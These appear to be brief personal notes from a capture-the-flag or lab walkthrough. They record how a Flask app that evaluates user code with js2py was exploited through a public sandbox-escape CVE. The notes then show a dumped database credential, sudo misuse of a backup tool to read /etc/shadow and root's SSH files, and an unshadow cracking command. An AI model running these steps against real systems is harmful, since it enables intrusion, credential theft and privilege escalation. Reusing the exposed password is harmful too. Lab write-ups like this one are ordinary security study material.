___


port 8000 running gunicorn


*libraries*
flask=3.0.3
flask-sqlalchemy=3.1.1
js2py=0.74


*evals  code*
result = js2py.eval_js(code)


*this is the CVE*
https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py

got shell


*dumped db*
marco:sweetangelbabylove

*this runs backup*
sudo /usr/local/bin/npbackup-cli --config npbackup.conf --backup


*dumped /etc/shadow*
sudo /usr/local/bin/npbackup-cli --config-file npbackup.conf --dump /etc/shadow


unshadow passwd_file.txt shadow_file.txt > unhadow.file



dumped /root/.ssh pass wasn't cracking

































